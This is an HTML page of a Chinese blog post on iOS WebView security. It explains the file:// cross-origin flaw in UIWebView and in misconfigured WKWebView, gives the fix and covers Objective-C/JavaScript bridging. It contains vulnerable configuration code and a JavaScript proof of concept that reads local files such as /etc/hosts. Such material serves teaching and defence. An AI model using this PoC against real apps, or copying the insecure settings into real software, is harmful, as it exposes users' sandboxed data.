@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="WebView是iOS用于显示网页的控件，是一个基于Webkit引擎、展现web页面的控件。WebView控件功能除了具有一般View的属性和设置外，还可对URL请求、页面加载、渲染、页面交互进行处理。 iOS下的Webview有UIWebView和WKWebView两种，其中UIWebView在iOS 8之后已经不推荐使用（https://developer.apple.com/document">
+<meta property="og:type" content="article">
+<meta property="og:title" content="iOS应用安全 —— WebView安全">
+<meta property="og:url" content="https://mabin004.github.io/2018/06/25/iOS应用沙箱/index.html">
+<meta property="og:site_name" content="m4bln">
+<meta property="og:description" content="WebView是iOS用于显示网页的控件，是一个基于Webkit引擎、展现web页面的控件。WebView控件功能除了具有一般View的属性和设置外，还可对URL请求、页面加载、渲染、页面交互进行处理。 iOS下的Webview有UIWebView和WKWebView两种，其中UIWebView在iOS 8之后已经不推荐使用（https://developer.apple.com/document">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://mabin004.github.io/images/pasted-54.png">
+<meta property="og:image" content="https://mabin004.github.io/images/pasted-55.png">
+<meta property="og:updated_time" content="2018-06-27T11:56:12.622Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="iOS应用安全 —— WebView安全">
+<meta name="twitter:description" content="WebView是iOS用于显示网页的控件，是一个基于Webkit引擎、展现web页面的控件。WebView控件功能除了具有一般View的属性和设置外，还可对URL请求、页面加载、渲染、页面交互进行处理。 iOS下的Webview有UIWebView和WKWebView两种，其中UIWebView在iOS 8之后已经不推荐使用（https://developer.apple.com/document">
+<meta name="twitter:image" content="https://mabin004.github.io/images/pasted-54.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://mabin004.github.io/2018/06/25/iOS应用沙箱/"/>
+
+
+
+
+
+  <title>iOS应用安全 —— WebView安全 | m4bln</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">m4bln</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-hint">
+          <a href="/hint/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            hint
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-todo">
+          <a href="/todo/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            ToDo
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://mabin004.github.io/2018/06/25/iOS应用沙箱/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="m4bln">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m4bln">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">iOS应用安全 —— WebView安全</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-25T18:17:00+08:00">
+                2018-06-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>WebView是iOS用于显示网页的控件，是一个基于Webkit引擎、展现web页面的控件。WebView控件功能除了具有一般View的属性和设置外，还可对URL请求、页面加载、渲染、页面交互进行处理。</p>
+<p>iOS下的Webview有UIWebView和WKWebView两种，其中UIWebView在iOS 8之后已经不推荐使用（<a href="https://developer.apple.com/documentation/uikit/uiwebview?changes=_6）,但仍然有很多APP使用UIWebView。" target="_blank" rel="noopener">https://developer.apple.com/documentation/uikit/uiwebview?changes=_6）,但仍然有很多APP使用UIWebView。</a></p>
+<h2 id="File跨域漏洞"><a href="#File跨域漏洞" class="headerlink" title="File跨域漏洞"></a>File跨域漏洞</h2><p><strong>UIWebView 此漏洞默认存在， WKWebView如果使用了不恰当的方式比如 [configuration.preferences setValue:@”TRUE” forKey:@”allowFileAccessFromFileURLs”]; 也会存在漏洞</strong></p>
+<p>攻击者可利用App文件下载机制将恶意文件写入沙盒内并诱导用户打开，当用户打开恶意文件时，其中的恶意代码可通过AJAX向“file://”域发起请求，从而远程获取App沙盒内所有的本地敏感数据。</p>
+<h3 id="UIWebView"><a href="#UIWebView" class="headerlink" title="UIWebView"></a>UIWebView</h3><p>UIWebView虽然已经被遗弃，但依然还有很多app继续使用，且最新版本的iOS也会兼容UIWebView。由于UIWebView本身存在严重的跨域漏洞，所以只要使用UIWebView都有可能存在跨域漏洞。</p>
+<p>漏洞原因在于UIWebView的WebKitAllowUniversalAccessFromFileURLs和WebKitAllowFileAccessFromFileURLs默认开启，导致通过js可以访问沙箱内的文件，甚至可以静默上传文件到远端。</p>
+<p>漏洞代码示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">UIWebView* uiweb = [[UIWebView alloc] initWithFrame:self.view.frame];</span><br><span class="line">uiweb.center = self.view.center;</span><br><span class="line">// 打开本地html文件</span><br><span class="line">NSString *resourcePath = [[NSBundle mainBundle] resourcePath];</span><br><span class="line">NSString *filePath =[resourcePath stringByAppendingPathComponent:@&quot;index.html&quot;];</span><br><span class="line">NSMutableString *htmlstring=[[NSMutableString alloc] initWithContentsOfFile:filePath  encoding:NSUTF8StringEncoding error:nil];</span><br><span class="line">NSURL *baseUrl=[NSURL fileURLWithPath:[[NSBundle mainBundle] bundlePath]];</span><br><span class="line">[uiweb loadHTMLString:htmlstring baseURL:baseUrl];</span><br><span class="line">[self.view addSubview:uiweb];</span><br></pre></td></tr></table></figure></p>
+<p>PoC代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var localfile = &quot;file:///etc/hosts&quot;</span><br><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange=function()</span><br><span class="line">    &#123;</span><br><span class="line">        if (xhr.readyState==4)</span><br><span class="line">        &#123;</span><br><span class="line">              alert(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        xhr.open(&quot;GET&quot;, localfile, true);</span><br><span class="line">        xhr.send();</span><br><span class="line">    &#125;</span><br><span class="line">    catch (ex) &#123;</span><br><span class="line">            alert(ex.message);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>被攻击者点击打开文件后，应用默认使用UIWebView进行加载，结果如下图：</p>
+<p><img src="/images/pasted-54.png" alt="upload successful"></p>
+<p>如果将localfile设置为”/User/Media/DCIM/100APPLE/xxx.JPG”即可以打开本地照片，设置成相对路径即可打开沙盒内的任意文件。</p>
+<p>修复方式是使用WKWebView替换UIWebView，并做好配置，因为WKWebView也不是绝对安全。</p>
+<h3 id="WKWebView"><a href="#WKWebView" class="headerlink" title="WKWebView"></a>WKWebView</h3><p>WKWebView默认allowFileAccessFromFileURLs和allowUniversalAccessFromFileURLs选项为false，但如果开发者开启了这两个API，同样存在跨域漏洞。</p>
+<p>需要注意的是allowFileAccessFromFileURLs和allowUniversalAccessFromFileURLs任意一个API设置为true，都会存在漏洞。另外，在OC中两个API的调用不同且均为私有API，详见以下代码。</p>
+<p>漏洞代码示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//配置WKWebView设置allowFileAccessFromFileURLs 为true</span><br><span class="line">    WKWebViewConfiguration * configuration = [[WKWebViewConfiguration alloc] init];</span><br><span class="line">    //[configuration.preferences setValue:@TRUE forKey:@&quot;allowFileAccessFromFileURLs&quot;];</span><br><span class="line">    [configuration setValue:@TRUE forKey:@&quot;allowUniversalAccessFromFileURLs&quot;];</span><br><span class="line">    WKWebView *wkweb = [[WKWebView alloc] initWithFrame:self.view.frame configuration:configuration];</span><br><span class="line">    wkweb.center = self.view.center;</span><br><span class="line">    wkweb.UIDelegate = self;//代理，需要实现alert</span><br><span class="line">    [self.view addSubview:wkweb];</span><br><span class="line">    </span><br><span class="line">    NSString *resourcePath = [[NSBundle mainBundle] resourcePath];</span><br><span class="line">    NSString *filePath =[resourcePath stringByAppendingPathComponent:@&quot;index.html&quot;];</span><br><span class="line">    NSMutableString *htmlstring=[[NSMutableString alloc] initWithContentsOfFile:filePath  encoding:NSUTF8StringEncoding error:nil];</span><br><span class="line">    NSURL *baseUrl=[NSURL fileURLWithPath:[[NSBundle mainBundle] bundlePath]];</span><br><span class="line">    [wkweb loadHTMLString:htmlstring baseURL:baseUrl];</span><br></pre></td></tr></table></figure></p>
+<p>开启API后执行结果如下：</p>
+<p><img src="/images/pasted-55.png" alt="upload successful"></p>
+<p>参考资料：</p>
+<ol>
+<li>CNNVD 关于iOS平台WebView组件跨域漏洞情况的通报 <a href="https://mp.weixin.qq.com/s/ZBMCgoQnYIUHVjrUHOlv4g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZBMCgoQnYIUHVjrUHOlv4g</a></li>
+<li><a href="https://bugs.webkit.org/show_bug.cgi?id=154916" target="_blank" rel="noopener">https://bugs.webkit.org/show_bug.cgi?id=154916</a></li>
+<li><a href="https://developer.apple.com/documentation/webkit/wkwebview" target="_blank" rel="noopener">https://developer.apple.com/documentation/webkit/wkwebview</a></li>
+</ol>
+<h2 id="OC和js的相互调用"><a href="#OC和js的相互调用" class="headerlink" title="OC和js的相互调用"></a>OC和js的相互调用</h2><h3 id="OC调用js"><a href="#OC调用js" class="headerlink" title="OC调用js"></a>OC调用js</h3><h4 id="UIWebView-1"><a href="#UIWebView-1" class="headerlink" title="UIWebView"></a>UIWebView</h4><ul>
+<li><p>1.<strong>stringByEvaluatingJavaScriptFromString</strong><br>该方法不能判断调用了一个js方法之后，是否发生了错误。当错误发生时，返回值为nil，而当调用一个方法本身没有返回值时，返回值也为nil，所以无法判断是否调用成功了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> NSString *str = [uiweb stringByEvaluatingJavaScriptFromString:@&quot;document.location.href=&apos;https://www.baidu.com&apos;;&quot;</span><br><span class="line"> &quot;document.title=&apos;test&apos;;&quot;</span><br><span class="line">&quot;setTimeout(document.write(&apos;aaaa&apos;),9000);&quot;];</span><br><span class="line">    NSLog(@&quot;%@&quot;,str);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2.<strong>JavaScriptCore（iOS 7.0 +）</strong><br>WebKit有一个内嵌的js环境，一般我们在页面加载完成之后，获取js上下文，然后通过JSContext的evaluateScript:方法来获取返回值。因为该方法得到的是一个JSValue对象，所以支持JavaScript的Array、Number、String、对象等数据类型。</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JSContext *jsContext = [uiwebView valueForKeyPath:@&quot;documentView.webView.mainFrame.javaScriptContext&quot;];</span><br><span class="line">JSValue *value = [jsContext evaluateScript:@&quot;document.write(&apos;http://www.qq.com&apos;)&quot;];</span><br><span class="line">NSLog(@&quot;%@&quot;,value.toString);</span><br></pre></td></tr></table></figure>
+<h4 id="WKWebView-1"><a href="#WKWebView-1" class="headerlink" title="WKWebView"></a>WKWebView</h4><p>WKWebView提供了一个evaluateJavaScript的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-(void)evaluateJavaScript:(NSString *)javaScriptString completionHandler:(void (^ _Nullable)(_Nullable id result, NSError * _Nullable error))completionHandler;</span><br></pre></td></tr></table></figure></p>
+<p>实例代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[self.webView evaluateJavaScript:@&quot;document.title&quot; completionHandler:^(id _Nullable title, NSError * _Nullable error) &#123;</span><br><span class="line">        NSLog(@&quot;调用evaluateJavaScript异步获取title：%@&quot;, title);</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure></p>
+<h3 id="js调用OC"><a href="#js调用OC" class="headerlink" title="js调用OC"></a>js调用OC</h3><h4 id="UIWebView-2"><a href="#UIWebView-2" class="headerlink" title="UIWebView"></a>UIWebView</h4><ul>
+<li><ol>
+<li><strong>拦截自定义scheme</strong></li>
+</ol>
+</li>
+</ul>
+<p>比如m4bln://。方法是在html或者js中，点击某个按钮触发事件时，跳转到自定义URL Scheme构成的链接，而OC中捕获该链接，从中解析必要的参数，实现JS到OC的一次交互。比如页面中一个a标签，链接如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;m4bln://login?aaa=xxx&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>OC代码实现如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-(BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType</span><br><span class="line">&#123;</span><br><span class="line">    //标准的URL包含scheme、host、port、path、query、fragment等</span><br><span class="line">    NSURL *URL = request.URL;</span><br><span class="line">    if ([URL.scheme isEqualToString:@&quot;m4bln&quot;]) &#123;</span><br><span class="line">        if ([URL.host isEqualToString:@&quot;login&quot;]) &#123;</span><br><span class="line">            NSLog(@&quot;js参数为 %@&quot;, URL.query);</span><br><span class="line">            return NO;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return YES;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>2.<strong>JavaScriptCore（iOS 7.0 +）</strong></li>
+</ul>
+<p>利用JavaScriptCore，在页面加载完成时，先获取js上下文。获取到之后，我们就可以进行强大的方法映射了。<br>例如，前端调用share方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function share(title, imgUrl, link) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>对应的OC代码为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-(void)webViewDidFinishLoad:(UIWebView *)webView</span><br><span class="line">&#123;</span><br><span class="line">   //获取该UIWebview的javascript上下文</span><br><span class="line">    //self持有jsContext</span><br><span class="line">    //@property (nonatomic, strong) JSContext *jsContext;</span><br><span class="line">    self.jsContext = [self.webView valueForKeyPath:@&quot;documentView.webView.mainFrame.javaScriptContext&quot;];</span><br><span class="line">    </span><br><span class="line">    //js调用oc</span><br><span class="line">    //其中share就是js的方法名称，赋给是一个block 里面是oc代码</span><br><span class="line">    //此方法最终将打印出所有接收到的参数，js参数是不固定的</span><br><span class="line">    self.jsContext[@&quot;share&quot;] = ^() &#123;</span><br><span class="line">        NSArray *args = [JSContext currentArguments];//获取到share里的所有参数</span><br><span class="line">        //args中的元素是JSValue，需要转成OC的对象</span><br><span class="line">        NSMutableArray *messages = [NSMutableArray array];</span><br><span class="line">        for (JSValue *obj in args) &#123;</span><br><span class="line">            [messages addObject:[obj toObject]];</span><br><span class="line">        &#125;</span><br><span class="line">        NSLog(@&quot;点击分享js传回的参数：\n%@&quot;, messages);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="WKWebView-2"><a href="#WKWebView-2" class="headerlink" title="WKWebView"></a>WKWebView</h4><ul>
+<li>1.<strong>拦截自定义scheme</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-(void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler &#123;</span><br><span class="line">    //可以通过navigationAction.navigationType获取跳转类型，如新链接、后退等</span><br><span class="line">    NSURL *URL = navigationAction.request.URL;</span><br><span class="line">    //判断URL是否符合自定义的URL Scheme</span><br><span class="line">    if ([URL.scheme isEqualToString:@&quot;darkangel&quot;]) &#123;</span><br><span class="line">        //根据不同的业务，来执行对应的操作，且获取参数</span><br><span class="line">        if ([URL.host isEqualToString:@&quot;smsLogin&quot;]) &#123;</span><br><span class="line">            NSString *param = URL.query;</span><br><span class="line">            NSLog(@&quot;短信验证码登录, 参数为%@&quot;, param);</span><br><span class="line">            decisionHandler(WKNavigationActionPolicyCancel);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    decisionHandler(WKNavigationActionPolicyAllow);</span><br><span class="line">    NSLog(@&quot;%@&quot;, NSStringFromSelector(_cmd));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>2.scriptMessageHandler</li>
+</ul>
+<p>(1) 创建WKWebViewConfiguration对象，配置各个API对应的MessageHandler。<br>(2) 创建WKWebView。<br>(3) 实现协议方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//首先别忘了，在configuration中的userContentController中添加scriptMessageHandler</span><br><span class="line">[controller addScriptMessageHandler:self name:@&quot;shareNew&quot;]; //记得适当时候remove</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//点击a标签时，则会调用下面的方法</span><br><span class="line">#pragma mark - WKScriptMessageHandler </span><br><span class="line"></span><br><span class="line">-(void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message &#123;</span><br><span class="line">    if ([message.name isEqualToString:@&quot;shareNew&quot;]) &#123;</span><br><span class="line">        NSDictionary *shareData = message.body;</span><br><span class="line">        NSLog(@&quot;shareNew分享的数据为： %@&quot;, shareData);</span><br><span class="line">        //模拟异步回调</span><br><span class="line">        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(4 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^&#123;</span><br><span class="line">            //读取js function的字符串</span><br><span class="line">            NSString *jsFunctionString = shareData[@&quot;result&quot;];</span><br><span class="line">            //拼接调用该方法的js字符串</span><br><span class="line">            NSString *callbackJs = [NSString stringWithFormat:@&quot;(%@)(%d);&quot;, jsFunctionString, NO];    //后面的参数NO为模拟分享失败</span><br><span class="line">            //执行回调</span><br><span class="line">            [self.webView evaluateJavaScript:callbackJs completionHandler:^(id _Nullable result, NSError * _Nullable error) &#123;</span><br><span class="line">                if (!error) &#123;</span><br><span class="line">                    NSLog(@&quot;模拟回调，分享失败&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;];</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>参考链接：</p>
+<ol>
+<li>iOS中UIWebView与WKWebView、JavaScript与OC交互  <a href="https://www.jianshu.com/p/ac45d99cf912" target="_blank" rel="noopener">https://www.jianshu.com/p/ac45d99cf912</a></li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/21/iOS应用安全-——-数据安全/" rel="next" title="iOS应用安全 —— 数据安全">
+                <i class="fa fa-chevron-left"></i> iOS应用安全 —— 数据安全
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/06/27/关于手机充电器/" rel="prev" title="关于手机充电器">
+                关于手机充电器 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">m4bln</p>
+              <p class="site-description motion-element" itemprop="description">影后入林到驿前</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">50</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#File跨域漏洞"><span class="nav-number">1.</span> <span class="nav-text"><a href="#File&#x8DE8;&#x57DF;&#x6F0F;&#x6D1E;" class="headerlink" title="File&#x8DE8;&#x57DF;&#x6F0F;&#x6D1E;"></a>File&#x8DE8;&#x57DF;&#x6F0F;&#x6D1E;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UIWebView"><span class="nav-number">1.1.</span> <span class="nav-text"><a href="#UIWebView" class="headerlink" title="UIWebView"></a>UIWebView</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WKWebView"><span class="nav-number">1.2.</span> <span class="nav-text"><a href="#WKWebView" class="headerlink" title="WKWebView"></a>WKWebView</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OC和js的相互调用"><span class="nav-number">2.</span> <span class="nav-text"><a href="#OC&#x548C;js&#x7684;&#x76F8;&#x4E92;&#x8C03;&#x7528;" class="headerlink" 